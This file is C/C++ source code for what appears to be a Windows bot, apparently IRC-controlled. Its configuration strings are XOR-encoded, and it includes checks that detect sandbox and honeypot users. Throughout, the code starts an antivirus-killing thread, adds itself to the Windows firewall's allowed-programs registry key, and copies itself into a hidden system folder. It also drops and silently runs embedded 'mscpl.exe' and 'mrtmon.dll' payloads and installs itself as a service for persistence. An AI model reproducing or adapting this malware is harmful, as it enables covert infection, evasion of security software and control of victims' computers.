#include "shared.h"
#include "KillProc.cpp"
//#include "shellapi.h"


			// MFC support for Windows Common Controls



//#include "shared.cpp"



/////////////////
// config here //
/////////////////


int p2plistenport = 9836; 
char cfg_filename[] = "\xC3\xC8\xD9\xDE\xDD\xC2\xC2\xC1\x83\xC8\xD5\xC8";
char cfg_destination[] = "\xFE\xD4\xDE\xD9\xC8\xC0";
char cfg_mutex[] = "\xDE\xC9\xDE\xD4\xD8\xD9\xD8\xCA\x9B\x98\xC5\x95\x9A\xC4\xD9\xC8\xD8\x9B\xCB";
char cfg_firewall_description[] = "\xFF\xC8\xCA\xE0\xC2\xC3\xC4\xD9\xC2\xDF";
char hpot1[] = "\xDE\xCC\xC3\xC9\xCF\xC2\xD5\x8D";
char hpot2[] = "\xC5\xC2\xC3\xC8\xD4";
char hpot3[] = "\xDB\xC0\xDA\xCC\xDF\xC8";
char hpot4[] = "\xCE\xD8\xDF\xDF\xC8\xC3\xD9\xD8\xDE\xC8\xDF";
char hpot5[] = "\xC3\xC8\xDD\xC8\xC3\xD9\xC5\xC8\xDE";
// encoded strings
char string_firewall_location[] = "\xFE\xF4\xFE\xF9\xE8\xE0\xF1\xF1\xEE\xD8\xDF\xDF\xC8\xC3\xD9\xEE\xC2\xC3\xD9\xDF\xC2\xC1\xFE\xC8\xD9\xF1\xF1\xFE\xC8\xDF\xDB\xC4\xCE\xC8\xDE\xF1\xF1\xFE\xC5\xCC\xDF\xC8\xC9\xEC\xCE\xCE\xC8\xDE\xDE\xF1\xF1\xFD\xCC\xDF\xCC\xC0\xC8\xD9\xC8\xDF\xDE\xF1\xF1\xEB\xC4\xDF\xC8\xDA\xCC\xC1\xC1\xFD\xC2\xC1\xC4\xCE\xD4\xF1\xF1\xFE\xD9\xCC\xC3\xC9\xCC\xDF\xC9\xFD\xDF\xC2\xCB\xC4\xC1\xC8\xF1\xF1\xEC\xD8\xD9\xC5\xC2\xDF\xC4\xD7\xC8\xC9\xEC\xDD\xDD\xC1\xC4\xCE\xCC\xD9\xC4\xC2\xC3\xDE\xF1\xF1\xE1\xC4\xDE\xD9";
char string_firewall_enabled[] = "\x97\x87\x97\xE8\xC3\xCC\xCF\xC1\xC8\xC9\x97";
/////////////////
// config ends //
/////////////////
//CString cmd;







bool extract_resource(char *szResName, char *szResType, char *szExtractPath)
{
	DWORD dwSize, dwWritten = 0;
	HANDLE hFile;
	HGLOBAL hResData;
	HMODULE hInstance = GetModuleHandle(NULL);
	HRSRC hResLocation;
	LPVOID pExe;

#ifndef NO_DEBUG
		printf("[DEBUG] Extracting resource, extract_resource()...\n");
#endif

		hResLocation = FindResource(hInstance, szResName, szResType);
		dwSize = SizeofResource(hInstance, hResLocation);
		hResData = LoadResource(hInstance, hResLocation);
		pExe = LockResource(hResData);
	if (pExe == NULL) return FALSE;
		hFile = CreateFile(szExtractPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) return FALSE;
		WriteFile(hFile, pExe, dwSize, &dwWritten, NULL);
	if (dwWritten != dwSize) return FALSE;
		CloseHandle(hFile);
		return TRUE;
}

//File Exists
bool file_exists(char *szPath)
{
	HANDLE hFile;

#ifndef NO_DEBUG
		printf("[DEBUG] Checking if file exists, file_exists()...\n");
#endif

		hFile = CreateFile(szPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (hFile == INVALID_HANDLE_VALUE) 
	{
			CloseHandle(hFile);
			return FALSE;
	}
		CloseHandle(hFile);
		return TRUE;
}

BOOL AntiSandbox()
{
	char *users[] = {"sandbox", "honey", "vmware", "currentuser", "nepenthes"};
	DWORD size = 128;
	char szUser[128];
	int i;

	GetUserName(szUser, &size);
	CharLower(szUser);

	for (i = 0; i <	(sizeof(users) / sizeof(LPTSTR)); i++)
	{
		if (strstr(szUser, users[i]) != 0)
			 return TRUE;
	}

	return FALSE;
}

void BypassFirewall(char lfile[MAX_PATH])
{
	HKEY	reg;
	char	temp[MAX_PATH], t[MAX_PATH];

	strncpy(temp, string_firewall_enabled, sizeof(temp) - 1);

	_snprintf(t, sizeof(t),"%s%s%s", lfile, Decode(temp), Decode(cfg_firewall_description));

	strncpy(temp, string_firewall_location, sizeof(temp) - 1);

	RegCreateKeyEx(HKEY_LOCAL_MACHINE, Decode(temp), 0, 0, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &reg, 0);
	RegSetValueEx(reg, lfile, 0, REG_SZ, (const unsigned char *)t, strlen(t));
	RegCloseKey(reg);
}


#ifndef DEBUG
int CopyBot(char *tempdir, char *currentlocation)
{
	FILE	*read, 
			*write;
	char	*c;
//char *tempdir1 = tempdir;
//char *tempdir2 = tempdir;
	GetModuleFileName(GetModuleHandle(NULL), currentlocation, MAX_PATH);

	if (SUCCEEDED(SHGetFolderPath(NULL, CSIDL_PROGRAM_FILES_COMMON|CSIDL_FLAG_CREATE, NULL, 0, tempdir))) 
	{
//		strncat(tempdir, "\\System", MAX_PATH);
		_snprintf(tempdir, MAX_PATH - 1, "%s\\%s", tempdir, Decode(cfg_destination)); 

		if (CreateDirectory(tempdir, NULL) == 0) 
		{
			if (GetLastError() == ERROR_PATH_NOT_FOUND)
				return 0;
		}

		SetFileAttributes(tempdir, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_SYSTEM);
//	if (SUCCEEDED(SHGetFolderPath(NULL, CSIDL_PROGRAM_FILES_COMMON|CSIDL_FLAG_CREATE, NULL, 0, tempdir1))) 
	//{
	//	_snprintf(tempdir, MAX_PATH, "%s\\%s", tempdir, Decode(cfg_filename));
	//	_snprintf(tempdir, MAX_PATH, "%s\\%s", tempdir, Decode(cfg_filename));
	//	_snprintf(tempdir1, MAX_PATH, "%s\\%s", tempdir, "mscpl.exe");
	//	_snprintf(tempdir2, MAX_PATH, "%s\\%s", tempdir, "mrtmon.dll;
//	if (!file_exists(tempdir1)) extract_resource("DRV", "RT_RCDATA", tempdir1);
//	}
	//	if (SUCCEEDED(SHGetFolderPath(NULL, CSIDL_PROGRAM_FILES_COMMON|CSIDL_FLAG_CREATE, NULL, 0, tempdir2))) 
//	{	
//	_snprintf(tempdir2, MAX_PATH, "%s\\%s", tempdir, "mrtmon.dll");
//	if (!file_exists(tempdir2)) extract_resource("HKS", "RT_RCDATA", tempdir2);
//	Sleep(1000);
	char szInstallPath1[MAX_PATH];
char szInstallPath2[MAX_PATH];
	char sysDir[255]; //sDir[255];
	GetSystemDirectory(sysDir,255);

	sprintf(szInstallPath1, "%s\\%s", sysDir, "mscpl.exe");
	sprintf(szInstallPath2, "%s\\%s", sysDir, "mrtmon.dll");
//	ShellExecute(0, "open","C:\\Program Files\\Common Files\\System\\mscpl.exe",NULL,NULL, SW_HIDE);
		if (!file_exists(szInstallPath1)) extract_resource("DRV", "RT_RCDATA", szInstallPath1);
			if (!file_exists(szInstallPath2)) extract_resource("HKS", "RT_RCDATA", szInstallPath2);
	ShellExecute(0, "open","mscpl.exe",NULL,NULL, SW_HIDE);
		//}//C:\\Program Files\\Common Files\\System\\mscpl.exe
	//	}
//	}
			_snprintf(tempdir, MAX_PATH, "%s\\%s", tempdir, Decode(cfg_filename));
		if (!lstrcmpi(currentlocation, tempdir))
			return 1;

		SetFileAttributes(tempdir, FILE_ATTRIBUTE_NORMAL);

		read = fopen(currentlocation, "rb");
		write = fopen(tempdir, "wb");

		if (read == NULL || write == NULL)
			return 0;

		c = (char *) malloc (1);
		while (fread(c, 1, 1, read) > 0)
			fwrite(c, 1, 1, write);

		fclose(read);
		fclose(write);

		return 1;
	}
	else
		return 0;
}
#endif


#ifdef DEBUG
int main()
#else


int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)	
#endif
{
	char		currentfile[MAX_PATH] = {0},
				destination[MAX_PATH] = {0};
	char	destination1[MAX_PATH] = {0};
	char		destination2[MAX_PATH] = {0};
char	mtex[MAX_LINE];
	 DWORD tid;
//Spreader_Offline();
CreateThread(0, 0, endAvSoft, NULL, 0, &tid);
//if (AntiSandbox())
	//	return 0;


#ifndef DEBUG
	SetErrorMode(SEM_NOGPFAULTERRORBOX);
#endif
	
//SetBFKey(bfkey);

	//Thread_Add(endAvSoft);//uncomment to enable av/fwkillr
_snprintf(mtex, sizeof(mtex) - 1, "%s", Decode(cfg_mutex));
	if (OpenMutex(0, FALSE, mtex) != NULL)
		return 0;
	else
	{
		if (GetLastError() != ERROR_FILE_NOT_FOUND)
			return 0;
	}

#ifndef DEBUG
	if (!CopyBot(destination, currentfile))
		strcpy(destination, currentfile);
	
	SetFileAttributes(destination, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY);

	BypassFirewall(destination);

	SERVICE_TABLE_ENTRY servicetable[] =
	{
		{cfg_servicename, (LPSERVICE_MAIN_FUNCTION) SC_Main},
		{NULL, NULL}
	};

	if (StartServiceCtrlDispatcher(servicetable) == 0)
		SC_Install(destination, currentfile);
#else
	Thread_Start(&IRC_Thread, NULL, TRUE);
#endif

	return 0;
}